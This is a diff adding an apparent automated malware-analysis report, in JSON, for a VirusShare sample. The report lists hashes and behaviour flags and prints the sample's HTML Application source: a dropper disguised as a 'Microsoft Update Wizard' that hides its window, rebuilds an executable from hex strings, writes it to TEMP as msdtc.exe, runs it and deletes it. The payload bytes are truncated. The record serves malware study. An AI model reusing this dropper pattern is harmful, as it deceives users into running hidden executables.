@@ -1,0 +1,78 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Chr": "May attempt to obfuscate specific str",
+            "CreateTextFile": "May create a text file",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Run": "May run an executable file or a system command",
+            "Write": "May write to a file"
+        },
+        "macro": "<HTML><HEAD>\n<TITLE>Microsoft Update Wizard</TITLE>\n<HTA:APPLICATION id=MSUpdate\nAPPLICATIONNAME=\"Microsoft Update\"\nSHOWINTASKBAR=NO\nCAPTION=YES\nSINGLEINSTANCE=YES\nMAXIMIZEBUTTON=NO\nMINIMIZEBUTTON=NO\nWINDOWSTATE=MINIMIZE\n/></HEAD>\n<OBJECT id=\"MSmedia\" classid=\"clsid:0D43FE01-F093-11CF-8940-00A0C9054228\"></OBJECT>\n<OBJECT id=\"MSplay\" classid=\"clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B\"></OBJECT>\n<BODY><NOSCRIPT>To display this page you need a browser with JavaScript support.</NOSCRIPT>\n<SCRIPT language=\"VBScript\">\nself.MoveTo 6000,6000\nDim IESetup\nDim o(788)\no(0)=\"4d5a00<edited>\"\no(1)=\"000040<edited>\"\n.\n.\n.\n783 lines removed...\n.\n.\n.\no(786)=\"e8564e<edited>\"\no(787)=\"5a6f37<edited>\"\nset wshProcEnv=MSplay.environment(\"process\")\nf=wshProcEnv(\"TEMP\") + \"msdtc.exe\"\nset IESetup=MSmedia.CreateTextFile(f, TRUE)\nFor j=0 To 787\no_Size=Len(o(j))\nFor k=1 To (o_Size-1) Step 2\nExe_Byte=Mid(o(j),k,2)\nExe_Byte=\"&H\"+Exe_Byte\nIESetup.Write(Chr(Exe_Byte))\nNext\nNext\nIESetup.Close()\nMSplay.Run(f),1,TRUE\nMSmedia.DeleteFile(f)\nself.Close\n</SCRIPT>\n</BODY></HTML>"
+    },
+    "filename": "VirusShare_0344cc3f2564f6fd57185240e03ca13f",
+    "filesize": 1098,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0344cc3f2564f6fd57185240e03ca13f",
+        "sha1": "a5067cedeca8965e102cb5573e24aa510ee18e21",
+        "sha256": "6c2ce7a725faefaebc7dbc77df3eca276bf5d72a665b3d55d7285c6f7d559833"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<HTML><HEAD>",
+            "<TITLE>Microsoft Update Wizard</TITLE>",
+            "<HTA:APPLICATION id=MSUpdate",
+            "APPLICATIONNAME=\"Microsoft Update\"",
+            "SHOWINTASKBAR=NO",
+            "CAPTION=YES",
+            "SINGLEINSTANCE=YES",
+            "MAXIMIZEBUTTON=NO",
+            "MINIMIZEBUTTON=NO",
+            "WINDOWSTATE=MINIMIZE",
+            "/></HEAD>",
+            "<OBJECT id=\"MSmedia\" classid=\"clsid:0D43FE01-F093-11CF-8940-00A0C9054228\"></OBJECT>",
+            "<OBJECT id=\"MSplay\" classid=\"clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B\"></OBJECT>",
+            "<BODY><NOSCRIPT>To display this page you need a browser with JavaScript support.</NOSCRIPT>",
+            "<SCRIPT language=\"VBScript\">",
+            "self.MoveTo 6000,6000",
+            "Dim IESetup",
+            "Dim o(788)",
+            "o(0)=\"4d5a00<edited>\"",
+            "o(1)=\"000040<edited>\"",
+            "783 lines removed...",
+            "o(786)=\"e8564e<edited>\"",
+            "o(787)=\"5a6f37<edited>\"",
+            "set wshProcEnv=MSplay.environment(\"process\")",
+            "f=wshProcEnv(\"TEMP\") + \"msdtc.exe\"",
+            "set IESetup=MSmedia.CreateTextFile(f, TRUE)",
+            "For j=0 To 787",
+            "o_Size=Len(o(j))",
+            "For k=1 To (o_Size-1) Step 2",
+            "Exe_Byte=Mid(o(j),k,2)",
+            "Exe_Byte=\"&H\"+Exe_Byte",
+            "IESetup.Write(Chr(Exe_Byte))",
+            "Next",
+            "Next",
+            "IESetup.Close()",
+            "MSplay.Run(f),1,TRUE",
+            "MSmedia.DeleteFile(f)",
+            "self.Close",
+            "</SCRIPT>",
+            "</BODY></HTML>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.263434",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
